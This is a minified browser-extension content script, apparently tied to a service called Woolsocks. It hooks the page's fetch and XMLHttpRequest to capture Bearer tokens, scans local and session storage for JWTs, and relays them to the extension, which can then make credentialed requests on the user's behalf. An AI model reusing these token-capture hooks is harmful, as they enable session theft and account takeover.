(function(){console.log("[WS Relay] Content script loaded on:",window.location.href);window.__WS_RELAY_READY__=!0;function h(t){return/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/.test(t)}function f(t){try{chrome.runtime.sendMessage({type:"WS_CAPTURE_TOKEN",token:t})}catch(e){console.warn("[WS Relay] Failed to send token:",e)}}window.addEventListener("message",t=>{if(t.origin!==window.location.origin)return;const e=t.data;e&&e.type==="WS_CAPTURE_TOKEN"&&typeof e.token=="string"&&h(e.token)&&f(e.token)});function l(){const t=`(() => {
    function sendToken(token) {
      try { window.postMessage({ type: 'WS_CAPTURE_TOKEN', token }, window.location.origin); } catch(_){}
    }
    function extractBearer(value) {
      if (!value) return null; const m = String(value).match(/Bearers+([^s]+)/i); return m ? m[1] : null;
    }

    function getAuthFromHeaders(h) {
      try {
        if (!h) return null;
        if (typeof h.get === 'function') {
          return h.get('Authorization') || h.get('authorization') || null;
        }
        if (Array.isArray(h)) {
          for (const kv of h) {
            if (!kv) continue; const k = String(kv[0] || '').toLowerCase(); if (k === 'authorization') return kv[1];
          }
          return null;
        }
        return h['Authorization'] || h['authorization'] || null;
      } catch(_) { return null; }
    }

    const _fetch = window.fetch;
    window.fetch = function(input, init) {
      try {
        // Check Request object first
        if (input && typeof input === 'object' && 'headers' in input && input.headers) {
          const authReq = getAuthFromHeaders(input.headers);
          const b1 = extractBearer(authReq);
          if (b1) sendToken(b1);
        }
        const h = init && init.headers ? init.headers : undefined;
        const auth = getAuthFromHeaders(h);
        const b2 = extractBearer(auth);
        if (b2) sendToken(b2);
      } catch(_){}
      return _fetch.apply(this, arguments);
    };

    const XHR = window.XMLHttpRequest;
    function XHRHook(){ return Reflect.construct(XHR, arguments, new.target); }
    XHRHook.prototype = XHR.prototype;
    XHRHook.prototype.setRequestHeader = function(k, v){
      try { if (String(k).toLowerCase() === 'authorization') { const t = extractBearer(v); if (t) sendToken(t); } } catch(_){}
      return XHR.prototype.setRequestHeader.apply(this, arguments);
    };
    window.XMLHttpRequest = XHRHook;

    // Attempt to find tokens in storage as well
    try {
      const scan = (s) => { for (let i=0;i<s.length;i++){ const val = s.getItem(s.key(i)); if(!val) continue; if (/^[A-Za-z0-9-_]+.[A-Za-z0-9-_]+.[A-Za-z0-9-_]+$/.test(val)) { sendToken(val); return true; } try { const obj = JSON.parse(val); const c = [obj && obj.token, obj && obj.accessToken, obj && obj.idToken, obj && obj.authToken]; for (const x of c) { if (typeof x === 'string' && /^[A-Za-z0-9-_]+.[A-Za-z0-9-_]+.[A-Za-z0-9-_]+$/.test(x)) { sendToken(x); return true; } } } catch(_){} } return false; };
      if (!scan(window.localStorage)) scan(window.sessionStorage);
    } catch(_){}
  })();`,e=document.createElement("script");e.textContent=t,(document.head||document.documentElement).appendChild(e),e.remove()}l();chrome.runtime.onMessage.addListener((t,e,o)=>{if(!t)return;if(t.type==="WS_PING"){o({ok:!0});return}if(t.type!=="WS_RELAY_FETCH")return;const{url:i,init:r}=t.payload||{url:"",init:void 0};return(async()=>{try{const n=await fetch(i,{credentials:"include",...r,headers:{...r?.headers,"x-application-name":"WOOLSOCKS_WEB"}}),a={};n.headers.forEach((u,d)=>{a[d]=u});const s=await n.text(),c={ok:n.ok,status:n.status,statusText:n.statusText,headers:a,bodyText:s};o(c)}catch(n){o({ok:!1,status:500,statusText:n?.message||"Relay fetch failed",headers:{},bodyText:JSON.stringify({error:n?.message})})}})(),!0});
})()
